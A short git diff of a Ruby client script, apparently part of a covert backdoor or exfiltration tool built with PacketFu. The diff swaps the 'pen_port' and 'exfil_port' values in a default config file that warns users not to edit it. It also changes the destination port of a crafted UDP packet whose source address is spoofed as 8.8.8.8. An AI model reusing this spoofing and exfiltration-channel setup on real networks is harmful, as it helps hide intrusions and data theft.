@@ -34,9 +34,9 @@ require_relative 'util.rb'
 CONFIG_FILE = "client.conf"
 CONFIG_FILE_DEFAULT = "\# This is an important system file! Please do not edit\n"
 CONFIG_FILE_DEFAULT << "\# pen_prot = tcp\n"
-CONFIG_FILE_DEFAULT << "\# pen_port = 8668\n"
+CONFIG_FILE_DEFAULT << "\# pen_port = 6886\n"
 CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
-CONFIG_FILE_DEFAULT << "\# exfil_port = 6886\n"
+CONFIG_FILE_DEFAULT << "\# exfil_port = 8668\n"
 CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
 CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
 CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
@@ -51,7 +51,7 @@ udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")
 
 #udp_pkt.eth_saddr = 
 #udp_pkt.eth_daddr = b8:ac:6f:34:ad:d8
-udp_pkt.udp_dst = 6886
+udp_pkt.udp_dst = 8668
 udp_pkt.udp_src = rand(0xffff)
 udp_pkt.ip_saddr = "8.8.8.8"
 udp_pkt.ip_daddr = "142.232.107.31"
